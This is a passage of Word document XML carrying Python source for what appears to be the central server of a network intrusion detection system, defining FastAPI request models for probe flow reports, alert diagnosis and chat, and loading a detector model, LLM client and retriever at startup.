        <w:t xml:space="preserve">  误报分析、召回率复盘都靠 flows 表，丢掉就没法复盘。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27F1BCDD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="564E26FC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38565956">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from __future__ import annotations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0627E629">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DEB71E6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import hmac</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CB1ACD7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import sys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BF33920">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7605BC49">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from contextlib import asynccontextmanager</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65BAF0E8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from pathlib import Path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD1EC14">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21B72045">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from fastapi import BackgroundTasks, FastAPI, Header, HTTPException</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BA726B8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from pydantic import BaseModel, Field</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F8667DD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37CD1CCA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>ROOT = Path(__file__).resolve().parent.parent</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="121814E9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>if str(ROOT) not in sys.path:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1686507D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    sys.path.insert(0, str(ROOT))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78CB3614">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E0349DB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from center.database import Store            # noqa: E402</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73DD3E93">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from center.inference import BASE_RISK, Detector  # noqa: E402</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43825D95">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from center.rules import RuleEngine, pick        # noqa: E402</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E31BF92">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from llm.client import LLMClient, LLMUnavailable, fallback_diagnosis  # noqa: E402</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42ABE7AF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from llm.rag import Retriever                # noqa: E402</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B3ED87C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from llm.schema import validate              # noqa: E402</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AF69C80">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from settings import load_config             # noqa: E402</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BB55283">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4819B611">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>MAX_FLOWS_PER_REPORT = 2000</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B9261C8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="039AE630">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="23FA0DC3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>class FlowIn(BaseModel):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F77F23A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    key: str</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A405BE3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    first_seen: float = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="180B73B7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    last_seen: float = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="536F0197">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    values: list[float]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31712DC9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5AF53CB1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18ACC5CF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>class ReportIn(BaseModel):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34D33026">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    probe_id: str</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34F8A4A0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    sent_at: float | None = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64877296">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    window: dict | None = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69C66D28">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    feature_names: list[str]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2894949A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    flows: list[FlowIn] = Field(default_factory=list)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47526D5D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D1F372B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="776A0BE7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>class DiagnoseIn(BaseModel):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52309AD1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    alert_id: int</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="381FC369">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    force: bool = False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="558118FA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="586CDD06">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D46EC29">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>class ChatIn(BaseModel):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F50CD88">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    alert_id: int | None = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74F056F7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    report_id: int | None = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22AC751D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    question: str</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B7DA5E6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20B6A909">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53AD112C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>@asynccontextmanager</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="405BB151">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>async def lifespan(app: FastAPI):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C5D6322">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    cfg = load_config(str(ROOT / "config.yaml"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ED5B23A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    app.state.cfg = cfg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11BA1035">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    app.state.store = Store(str(ROOT / cfg["center"]["db_path"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BD4825D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    app.state.detector = Detector(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F7A524F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        str(ROOT / cfg["center"]["model_path"]), str(ROOT / cfg["center"]["schema_path"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4182320F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7320497F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    app.state.llm = LLMClient(cfg["llm"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7781D4D3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    app.state.retriever = Retriever(str(ROOT / cfg["rag"]["chunks_path"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70D3D7AD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
